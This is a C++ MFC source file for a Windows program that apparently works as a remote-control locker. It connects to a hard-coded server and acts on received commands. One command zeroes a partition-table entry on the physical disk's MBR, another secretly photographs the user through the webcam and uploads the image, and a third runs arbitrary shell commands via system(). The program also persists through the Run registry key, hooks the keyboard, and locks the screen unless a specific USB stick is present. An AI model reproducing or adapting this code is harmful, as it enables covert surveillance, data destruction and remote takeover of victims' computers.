
// NDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "N.h"
#include "NDlg.h"
#include "afxdialogex.h"
#include <Dbt.h>
#include<winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include<iostream>
#include <VersionHelpers.h>
#include <string.h>
#include<afxsock.h>
#include <winioctl.h>
#include "cv.h"
#include<highgui.h>
#include <opencv2\opencv.hpp> 
#pragma comment (lib,"ws2_32")
using namespace std;
using namespace cv;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define WM_USER_NOTIFYICON WM_USER+1
_declspec(dllimport) void SetHook(bool q);


HWND g_hWnd;
CBrush m_brush;
SOCKET g_cliScoket;
int g_flag = 0;
HKEY hWrite;
HKEY hUsb;
TCHAR pUsbnum[MAX_PATH] = _T("HGH");
//TCHAR pUsbnum1[MAX_PATH] = _T("USB\\VID_090C&PID_1000\\AA00000000003671");
TCHAR* pUsbnum1 = new TCHAR [MAX_PATH];
TCHAR pFileName[MAX_PATH] = _T("HGH");

DWORD dw = GetModuleFileName(NULL, pFileName, MAX_PATH);
DWORD du;
DWORD dUSize = sizeof(pUsbnum);
BOOL g_LAN = FALSE;
unsigned char g_FixMbr[16] = {NULL};
#define BOOTRECORDSIZE 440
#define DPTNUMBER 4
#define DPTSIZE 64
typedef struct _BOOTRECORD {


	unsigned char BootRecord[BOOTRECORDSIZE];


}BOOTRECORD, *PBOOTRECORD;



typedef struct _DPT {


	unsigned char Dpt[DPTSIZE];


}DPT, *PDPT;





typedef struct _MBR {

	BOOTRECORD BootRecord;              //��������
	unsigned char ulSinged[4];          //Windows ����ǩ��
	unsigned char sReserve[2];          //����λ
	DPT Dpt;                            //������
	unsigned char EndSign[2];           //������־




}MBR, *PMBR;


typedef struct _DP {

	unsigned char BootSign;           //������־
	unsigned char StartHsc[3];
	unsigned char Partitiontype;        //��������
	unsigned char EndHsc[3];
	unsigned int SectorsPreceding;    //������֮ǰʹ�õ�������
	unsigned int SectorInPartition;
}DP, *PDP;



// CNDlg �Ի���





afx_msg LRESULT  CNDlg::OnHookMsg(WPARAM wparam, LPARAM lparam) {

	SetHook(TRUE);                                         //////////////////////////////////////////////
	return 0;
}


afx_msg LRESULT  CNDlg::OnUnHookMsg(WPARAM wparam, LPARAM lparam) {

	SetHook(FALSE);
	return 0;
}


afx_msg LRESULT  CNDlg::OnShowMsg(WPARAM wparam, LPARAM lparam) {

	GetDlgItem(IDC_STATIC1)->SetWindowTextW((WCHAR*)wparam);
	return 0;
}
afx_msg LRESULT  CNDlg::OnStartMsg(WPARAM wparam, LPARAM lparam) {

	CNDlg::Start_Service();
	return 0;
}

int Sender(TCHAR FileName[],SOCKET* Client_Socket) {
	//AfxSocketInit();


	int tag = 0;
	DWORD dwRead;

	BOOL bRet;
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	char ReadBuf[150700];
	CHAR End[5] = { "End!" };
	while (TRUE) {




		bRet = ReadFile(hFile, ReadBuf, 150400, &dwRead, NULL);
		if (bRet == 0) {
			break;

		}

		else if (dwRead == 0) {
			send(*Client_Socket, End, 5, 0);
			Sleep(1500);
			break;
		}

		else
		{

			send(*Client_Socket
				, ReadBuf, 150400, 0);
		}

	}

	CloseHandle(hFile);

	return tag = 1;
}


int TakePhoto(SOCKET * Client_Socket) {
	int tag = 0;
	char keyCode = 0;
	IplImage  outimage;
	Mat input_image;
	VideoCapture cam(0);
	if (!cam.isOpened()) exit(0);
	namedWindow("input image");

	cam >> input_image;

	outimage = input_image;

	CHAR* outImageName = "d://test.jpg";
	cvSaveImage(outImageName, &outimage);


	cvDestroyAllWindows();
	if (g_LAN) {
		tag = Sender(L"d://test.jpg", Client_Socket);
	}
	return tag;

}

void Save_MBR() {
	MBR Mbr = { 0 };

	DWORD dwRead = 0;
	DWORD dwBytesReturned = 0;
	DWORD dwNumberOfBytesWritten = 0;
	PMBR pMbrKill = &Mbr;
	unsigned char ReadMbr[16] = { NULL };
	HANDLE hFile = CreateFile(L"mbr.dat", GENERIC_WRITE,

		FILE_SHARE_WRITE,

		NULL,

		CREATE_ALWAYS,

		FILE_ATTRIBUTE_NORMAL,

		NULL

		);
	HANDLE hDevice2;
	if (hDevice2 = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL)) {

	}
	if (ReadFile(hDevice2, (LPVOID)pMbrKill, 512, &dwRead, NULL)) {

	}
	//for (int i = 32; i < 48; i++) {
	DWORD size;
	WriteFile(hFile, &Mbr.Dpt.Dpt[16]
	,16,&size,NULL);
	SendMessage(g_hWnd,WM_Show_Message,(WPARAM)L"����MBR�ɹ�",NULL);
	CloseHandle(hFile);
	CloseHandle(hDevice2);
	//Mbr.Dpt.Dpt[i] = { 0 };
	//}
}


void Read_Mbr() {

HANDLE hFile = CreateFile(L"mbr.dat", GENERIC_READ,

	FILE_SHARE_READ | FILE_SHARE_WRITE,

	NULL,

	OPEN_EXISTING,

	FILE_ATTRIBUTE_NORMAL,

	NULL

	);
DWORD size;
if (ReadFile(hFile, (LPVOID)g_FixMbr, 16, &size, NULL)) {

}
CloseHandle(hFile);

}




void kill(HANDLE hDevice, int check) {

	MBR Mbr = { 0 };

	DWORD dwRead = 0;
	DWORD dwBytesReturned = 0;
	DWORD dwNumberOfBytesWritten = 0;
	PMBR pMbrKill = &Mbr;


	//unsigned char FixMbr[16] = { 0x00 ,0xFE ,0xFF ,0xFF ,0x0F ,0xFE ,0xFF ,0xFF ,0x00 ,0x70 ,0xC8 ,0x0E ,0x00 ,0x48 ,0x1F ,0x00 };

	if (ReadFile(hDevice, (LPVOID)pMbrKill, 512, &dwRead, NULL)) {

		

	}

	CloseHandle(hDevice);

	if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL)) {
		
	}

	

	for (int i = 16; i < 32; i++) {

		Mbr.Dpt.Dpt[i] = { 0 };
	}

	if (DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
	{

	}

	if (check == 1) {

		if (WriteFile(hDevice, (LPCVOID)pMbrKill, 512, &dwNumberOfBytesWritten, NULL)) {
			
			CloseHandle(hDevice);
		}

	}
	else if (check == 2) {

		for (int i = 16, j = 0; i < 32; i++, j++) {
			
			Mbr.Dpt.Dpt[i] = g_FixMbr[j];
		}
		if (WriteFile(hDevice, (LPCVOID)pMbrKill, 512, &dwNumberOfBytesWritten, NULL)) {
			
			CloseHandle(hDevice);
		}
	}
	if (DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
	{
		//	cout << "UNLOCK successful \r\n" << endl;

	}


}
/*
int CNDlg::server(){
	AfxSocketInit();


	int flag = 0;
	int tag=0;
	CSocket aSocket;
	aSocket.Socket();
	UINT nPort = atoi("827");
	BOOL bOptVal = TRUE;
	char szRecvMsg[7] = { 0 };
	int bOptLen = sizeof(BOOL);
	char key[7] = { "nibiru" };
	char lock[7]{"holmes"};
	char Kill[7] = {"kilmbr"};
	char Fix[7] = {"fixmbr"};
	char Photo[7] = { "photos" };
	char Shutdown[7] = { "shutdn" };
	char cmd[20] = { 0 };
	aSocket.SetSockOpt(SO_REUSEADDR, (void *)&bOptVal, bOptLen, SOL_SOCKET);
	CString cs;
	aSocket.Bind(nPort);
	aSocket.Listen();



	aSocket.Accept(g_ClientSocket);
	
	//AfxMessageBox(L"Accept");
	g_ClientSocket.Receive(szRecvMsg, 6);
	//sprintf_s(szRecvMsg,sizeof(szRecvMsg), "���ܵ��Ĳ�����: %s \r\n", szRecvMsg);
	cs = szRecvMsg;

	if (!strcmp(szRecvMsg, key)){
		
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
		//SetHook(false);
		SendMessage(WM_UnHook_Message);
		tag = 1;

	}
	else if (!strcmp(szRecvMsg, lock)) {
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
		//SetHook(true);
		SendMessage(WM_Hook_Message);
		tag = 1;
	}
	
	else if (!strcmp(szRecvMsg, Kill)) {
		HANDLE hDevice;



		if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) {
			printf("CreateFile successful");
		}

		kill(hDevice, 1);

	}
	else if (!strcmp(szRecvMsg, Fix)) {
		HANDLE hDevice;



		if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) {
			printf("CreateFile successful");
		}

		kill(hDevice, 2);
		
	}
	else if (!strcmp(szRecvMsg, Photo)) {


		//MessageBox(NULL, L"Take photo", L"Error", MB_OK);
		flag=TakePhoto();
		while (!flag) {}
		//photosocket = g_ClientSocket;

	}
	else if(!strcmp(szRecvMsg, Shutdown)) {
		memset(cmd,0,20);
		g_ClientSocket.Receive(cmd, sizeof(cmd));
		//MessageBox(NULL,cmd, L"Error", MB_OK);
	//	WinExec(cmd, SW_SHOW);
		system(cmd);

	}
	g_ClientSocket.Close();//�ر�  
	aSocket.Close();
	return tag;

}

*/



void CNDlg::Start_Service() {     //�׽��ִ���������

	CEdit * IpText = (CEdit*)GetDlgItem(IDC_EDIT1);
	CEdit * PortText = (CEdit*)GetDlgItem(IDC_EDIT2);
	CString USB_key;
	CString ip_c;
	CString port_c;
	memset(pUsbnum1, 0, sizeof(pUsbnum1));
	GetDlgItem(IDC_EDIT3)->GetWindowTextW(USB_key);
	//SendMessage(WM_Show_Message, (WPARAM)&USB_key, NULL);
	_tcscpy(pUsbnum1, USB_key);

	char ip[20] = { 0 };
	u_short Port;
	IpText->GetWindowTextW(ip_c);
	PortText->GetWindowTextW(port_c);
	WideCharToMultiByte(CP_OEMCP, NULL, ip_c, -1, ip, ip_c.GetLength(), NULL, FALSE);
	Port = _ttoi(port_c);
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	sockaddr_in addrCli;
	inet_pton(AF_INET, ip, &addrCli.sin_addr.s_addr);
	addrCli.sin_family = AF_INET;
	addrCli.sin_port = htons(Port);
	g_cliScoket = socket(AF_INET, SOCK_STREAM, 0);
	
	if (!connect(g_cliScoket, (sockaddr*)&addrCli, sizeof(addrCli))) {
		//p_text->SetWindowTextW(L"connect success");
		//SendMessage(WM_Show_Message,(WPARAM)L"���ӷ������ɹ�",NULL);
		CreateThread(NULL, 0, RecvThread, (LPVOID)NULL, 0, NULL);
	}

	


}


static DWORD WINAPI RecvThread(LPVOID lp) {   //�����߳�


	char key[7] = { "nibiru" };
	char lock[7]{ "holmes" };
	char Kill[7] = { "kilmbr" };
	char Fix[7] = { "fixmbr" };
	char Photo[7] = { "photos" };
	char Shutdown[7] = { "shutdn" };
	char cmd[20] = { 0 };
	char check[7] = {NULL};

	TCHAR szRecvBuf[BufLengrh] = { 0 };
	CHAR szRecvBufchar[BufLengrh] = { 0 };
	CEdit*(lpText) = (CEdit*)lp;
	memset(szRecvBuf, 0, sizeof(szRecvBuf));
	memset(szRecvBufchar, 0, sizeof(szRecvBufchar));
	while (TRUE) {

		memset(szRecvBufchar, 0, sizeof(szRecvBufchar));
		if (recv(g_cliScoket, szRecvBufchar, BufLengrh, 0) < 0) { 
			SendMessage(g_hWnd, WM_Show_Message, (WPARAM)L"�ѶϿ�����", NULL);
			SendMessage(g_hWnd,WM_Start_Message,NULL,NULL);
			return 0; }
		memset(szRecvBuf, 0, sizeof(szRecvBuf));
		
		MultiByteToWideChar(CP_ACP, 0, szRecvBufchar, -1, szRecvBuf, sizeof(szRecvBuf));
		// MultiByteToWideChar(CP_ACP, 0, sText, -1, NULL, 0);
		//lpText->SetWindowTextW(szRecvBuf);
		SendMessage(g_hWnd,WM_Show_Message,(WPARAM)&szRecvBuf,NULL);
		//aSocket.Receive(szRecvBuf,10);*/
		for (int i = 0; i < 6; i++) {
		
			check[i] = szRecvBufchar[i];
		}
		check[6] = 0;
		if (!strcmp(check, key)) {

			AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
			//SetHook(false);
			SendMessage((HWND)g_hWnd, WM_UnHook_Message, NULL, NULL);
			//tag = 1;

		}
		else if (!strcmp(check, lock)) {
			AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
			SetHook(true);
			//SendMessage((HWND)g_hWnd, WM_Hook_Message, NULL, NULL);
			
		}

		else if (!strcmp(check, Kill)) {

			Save_MBR();
			HANDLE hDevice;



			if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				0,
				NULL)) {
				//printf("CreateFile successful");
			}

			kill(hDevice, 1);

		}
		else if (!strcmp(check, Fix)) {
			Read_Mbr();
			HANDLE hDevice;



			if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				0,
				NULL)) {
				//printf("CreateFile successful");
			}

			kill(hDevice, 2);

		}
		else if (!strcmp(check, Photo)) {


			//MessageBox(NULL, L"Take photo", L"Error", MB_OK);
			g_flag = TakePhoto(&g_cliScoket);
		
			//photosocket = g_ClientSocket;

		}
		else if (!strcmp(check, Shutdown)) {
			memset(cmd, 0, 20);
			//g_ClientSocket.Receive(cmd, sizeof(cmd));
			if (recv(g_cliScoket, cmd, sizeof(cmd), 0) < 0) { return 0; }
			//MessageBox(NULL,cmd, L"Error"cmd, MB_OK);
			//	WinExec(cmd, SW_SHOW);
			system(cmd);

		}
	}
	return 0;
}

/*DWORD WINAPI Server_Thread(LPVOID lParam) {
	AfxSocketInit();

	char szRecvMsg[7] = { 0 };
	int bOptLen = sizeof(BOOL);
	char key[7] = { "nibiru" };
	char lock[7]{ "holmes" };
	char Kill[7] = { "kilmbr" };
	char Fix[7] = { "fixmbr" };
	char Photo[7] = { "photos" };
	char Shutdown[7] = { "shutdn" };
	char cmd[20] = { 0 };
	UINT nPort = atoi("827");
	int flag = 0;
	int tag = 0;
	
	BOOL bOptVal = TRUE;
	
	//CString cs;

	while (true)
	{


	
		CSocket aSocket;
		aSocket.Socket();
		CSocket Client_Socket;
		aSocket.SetSockOpt(SO_REUSEADDR, (void *)&bOptVal, bOptLen, SOL_SOCKET);
		//CString cs;
		aSocket.Bind(nPort);
		aSocket.Listen();



		aSocket.Accept(Client_Socket);
		//g_ClientSocket = Client_Socket;
		//AfxMessageBox(L"Accept");
		Client_Socket.Receive(szRecvMsg, 6);
		//sprintf_s(szRecvMsg,sizeof(szRecvMsg), "���ܵ��Ĳ�����: %s \r\n", szRecvMsg);
		// = szRecvMsg;

		if (!strcmp(szRecvMsg, key)) {

			AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
			//SetHook(false);
			SendMessage((HWND)lParam, WM_UnHook_Message, NULL, NULL);
			tag = 1;

		}
		else if (!strcmp(szRecvMsg, lock)) {
			AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
			//SetHook(true);
			SendMessage((HWND)lParam, WM_Hook_Message, NULL, NULL);
			tag = 1;
		}

		else if (!strcmp(szRecvMsg, Kill)) {
			HANDLE hDevice;



			if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				0,
				NULL)) {
				printf("CreateFile successful");
			}

			kill(hDevice, 1);

		}
		else if (!strcmp(szRecvMsg, Fix)) {
			HANDLE hDevice;



			if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				0,
				NULL)) {
				printf("CreateFile successful");
			}

			kill(hDevice, 2);

		}
		else if (!strcmp(szRecvMsg, Photo)) {


			//MessageBox(NULL, L"Take photo", L"Error", MB_OK);
			flag = TakePhoto(&g_cliScoket);
			while (!flag) {}
			//photosocket = g_ClientSocket;

		}
		else if (!strcmp(szRecvMsg, Shutdown)) {
			memset(cmd, 0, 20);
			g_ClientSocket.Receive(cmd, sizeof(cmd));
			//MessageBox(NULL,cmd, L"Error", MB_OK);
			//	WinExec(cmd, SW_SHOW);
			system(cmd);

		}
		//�ر�  
		aSocket.Close();
		Client_Socket.Close();
	}
	g_ClientSocket.Close();
	return tag;

}*/

CNDlg::CNDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CNDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CNDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_MESSAGE(WM_USER_NOTIFYICON, OnNotifyMsg)//��Ϣӳ��
	ON_MESSAGE(WM_Hook_Message, OnHookMsg)//��Ϣӳ��
	ON_MESSAGE(WM_UnHook_Message, OnUnHookMsg)
	ON_MESSAGE(WM_Start_Message, OnStartMsg)
	ON_MESSAGE(WM_Show_Message, OnShowMsg)
	ON_BN_CLICKED(IDOK, &CNDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &CNDlg::OnBnClickedCancel)
	
	
	ON_BN_CLICKED(IDC_BUTTON1, &CNDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON5, &CNDlg::OnBnClickedButton5)
END_MESSAGE_MAP()


// CNDlg ��Ϣ�������

BOOL CNDlg::OnInitDialog()
{
	
	
	
	CDialogEx::OnInitDialog();
	//SetHook(true);
	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��
	m_tnid.cbSize = sizeof NOTIFYICONDATA;
	m_tnid.hWnd = this->m_hWnd;
	m_tnid.uID = IDR_MAINFRAME;
	m_tnid.hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
	m_tnid.uCallbackMessage = WM_USER_NOTIFYICON;
	m_tnid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP; //OK,����������̲�����.   
	Shell_NotifyIcon(NIM_ADD, &m_tnid);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, NULL,
	REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hWrite, &dw);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hWrite);
	RegSetValueEx(hWrite, L"Nibiru Holmes", 0, REG_SZ, (const PBYTE)pFileName, (_tcslen(pFileName) + 1) * sizeof(TCHAR));
	
	
	AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
	
    g_hWnd = GetSafeHwnd();
	CEdit * IpText = (CEdit*)GetDlgItem(IDC_EDIT1);
	CEdit * PortText = (CEdit*)GetDlgItem(IDC_EDIT2);
	CEdit * USB = (CEdit*)GetDlgItem(IDC_EDIT3);
	IpText->SetWindowTextW(L"120.27.38.57");
	PortText->SetWindowTextW(L"827");
	USB->SetWindowTextW(_T("USB\\VID_090C&PID_1000\\AA00000000003671"));
	//DWORD Server_id;
	//CreateThread(NULL,0,Server_Thread,(LPVOID)g_hWnd,0,&Server_id);
	
	
	
	// TODO:  �ڴ���Ӷ���ĳ�ʼ������
	
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CNDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
	int cxScreen, cyScreen;//���ڴ�С����
	cxScreen = GetSystemMetrics(SM_CXSCREEN);
	cyScreen = GetSystemMetrics(SM_CYSCREEN);
	SetWindowPos(&wndTopMost, 0, 0, cxScreen, cyScreen, SWP_SHOWWINDOW);//�����ڱ�������ǰ�档
	//SetHook(true);
	//server();
	
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CNDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

char FirstDriveFromMask(ULONG unitmask)//�̷���ȡ
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

LRESULT CNDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{

	// TODO: �ڴ����ר�ô����/����û���
	switch (message)
	{
		//WM_DEVICECHANGE��ϵͳӲ���ı䷢����ϵͳ��Ϣ
	case WM_DEVICECHANGE:
	{
							PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
							switch (wParam)
							{
							case WM_DEVICECHANGE:
								break;
							case DBT_DEVICEARRIVAL://DBT_DEVICEARRIVAL���豸�����������ҿ���ʹ��
							{
													   if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)//�߼���
													   {
														   PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
														   switch (lpdbv->dbcv_flags)
														   {
														   case 0:                //U��
														   {
																					  CString decDriver;
																					  decDriver = FirstDriveFromMask(lpdbv->dbcv_unitmask);
																					  //TRACE1("��⵽U��:[%s]����!\n",decDriver.GetBuffer(0))
																					  //AfxMessageBox(L"��⵽U�̲���");
																					  RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\USBSTOR\\Enum", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hUsb);
																					  RegQueryValueEx(hUsb, L"0", NULL, NULL, (LPBYTE)pUsbnum, &dUSize);
																					  //MessageBox((LPCTSTR)pUsbnum1);
																					  //MessageBox((LPCTSTR)pUsbnum);
																					  

																					  SendMessage(WM_Show_Message, (WPARAM)&pUsbnum1, NULL);
																					  if (!(lstrcmp(pUsbnum,pUsbnum1))){
																						 
																						 
																						  AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
																						  SendMessage( WM_UnHook_Message, NULL, NULL);
																				          (false);
																					  }
																					  
																					  

														   }
															   break;
														   }
													   }
							}
								break;
							case DBT_DEVICEREMOVECOMPLETE://DBT_DEVICEREMOVECOMPLETE,�豸ж�ػ��߰γ�
							{
															  if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)//�߼���
															  {
																  PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
																  switch (lpdbv->dbcv_flags)
																  {
																  case 0:                //U��
																  {
																							 CString decDriver;
																							 decDriver = FirstDriveFromMask(lpdbv->dbcv_unitmask);
																							 //TRACE1("��⵽U��:[%s]�γ�!\n",decDriver.GetBuffer(0));								
																							 
																							 AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
																							 SendMessage(WM_Show_Message, (WPARAM)L"����", NULL);
																							 SendMessage(WM_Hook_Message, NULL, NULL);
																							// AfxMessageBox(L"look");
																							 
																							 /*while (!flag){
																								 flag = Server();
																							 
																							 }*/
																							// AfxMessageBox(L"unlook");
																							// SetHook(true);
																							
																  }
																	  break;
																  }
															  }
							}
								break;
							}
	}
		break;
		//while (1){ server(); }
	}
	//�������е���Ϣ����
	switch (message) //�ж���Ϣ����  
	{
	case WM_USER_NOTIFYICON:
		//������û��������Ϣ   
		if (lParam == WM_LBUTTONDBLCLK)

		{
			//���˫��ʱ�����ڳ���   
			if (AfxGetApp()->m_pMainWnd->IsWindowVisible()) //�жϴ��ڵ�ǰ״̬  
			{
				AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE); //���ش���  
			}
			else
			{
				AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW); //��ʾ����   
			}

		}
		/*else if(lParam==WM_RBUTTONDOWN)
		{ //����Ҽ���������ѡ��
		CMenu menu;
		menu.LoadMenu(IDR_MENU1); //�������ȶ����ѡ��
		CMenu *pMenu=menu.GetSubMenu(0);
		CPoint pos;
		GetCursorPos(&pos);
		pMenu->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON,pos.x,pos.y,AfxGetMainWnd());
		} */
		break;
	case WM_SYSCOMMAND:
		//�����ϵͳ��Ϣ   
		if (wParam == SC_MINIMIZE)
		{
			//���յ���С����Ϣʱ����������   
			AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
			return 0;
		}
		if (wParam == SC_CLOSE)
		{
			::Shell_NotifyIcon(NIM_DELETE, &m_tnid); //�ر�ʱɾ��ϵͳ����ͼ��  
		}
		break;
	}


	return CDialog::WindowProc(message, wParam, lParam);
}

LRESULT  CNDlg::OnNotifyMsg(WPARAM wparam, LPARAM lparam)  //�Զ�����Ϣ��Ӧ����
//wParam���յ���ͼ���ID����lParam���յ���������Ϊ     
{
	if (wparam != IDR_MAINFRAME)
		return    1;
	switch (lparam)
	{
		/*case  WM_RBUTTONUP://�Ҽ�����ʱ������ݲ˵�������ֻ��һ�����رա�
		{
		LPPOINT    lpoint=new    tagPOINT;
		::GetCursorPos(lpoint);//�õ����λ��
		CMenu    menu;
		menu.CreatePopupMenu();//����һ������ʽ�˵�
		//���Ӳ˵���رա������������ϢWM_DESTROY�������ڣ���
		//���أ��������������
		menu.AppendMenu(MF_STRING,WM_DESTROY,"�ر�");
		//ȷ������ʽ�˵���λ��
		menu.TrackPopupMenu(TPM_LEFTALIGN,lpoint->x,lpoint->y,this);
		//��Դ����
		HMENU    hmenu=menu.Detach();
		menu.DestroyMenu();
		delete    lpoint;
		}
		break; */
	case    WM_LBUTTONDBLCLK://˫������Ĵ���     
	{
								 this->ShowWindow(SW_SHOW);//�򵥵���ʾ������     
	}
		break;
	}

	return 0;
}

void CNDlg::OnBnClickedOk()
{
	AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
	//while (1){ server(); }
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	
}


void CNDlg::OnBnClickedCancel()
{

	CNDlg::Start_Service();
}






void CNDlg::OnBnClickedButton1()
{
	g_LAN = TRUE;
	// TODO: �ڴ���ӿؼ�֪ͨ����������
}


void CNDlg::OnBnClickedButton5()
{

	Save_MBR();
	// TODO: �ڴ���ӿؼ�֪ͨ����������
}
